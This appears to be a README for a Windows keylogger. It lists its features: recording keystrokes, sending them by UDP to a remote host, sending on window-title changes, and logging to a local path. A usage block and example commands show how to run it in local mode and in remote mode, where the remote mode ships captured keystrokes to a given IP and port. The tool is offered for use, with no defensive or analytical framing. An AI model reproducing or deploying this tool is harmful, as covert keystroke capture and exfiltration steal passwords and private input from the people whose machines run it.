## keylogger

This software can run in windows!

1. record key
2. sendudp msg to your host
3. when title change,send 
4. record log to local host

```shell
usage:
    keylogger [flag=local] ([ip=127.0.0.1] [port=22345]|[logpath=D:/keylogger/])

    flag:
        local   meaning it's local host,next param is the logpath.
        remote  meaning it's will send msmg to remote host,next param is ipaddr. and port of recv. server.
        ...     it's not support this option
    ip:
                it support IPV4,but the flag must `remote`
    port:
                the UDP port of remote recv. server
    logpath:
                when the flag is local,logpath configure to write log.

    example：
        keylogger local “D:/keylogger"
        keylogger remote 10.10.12.12 22345
```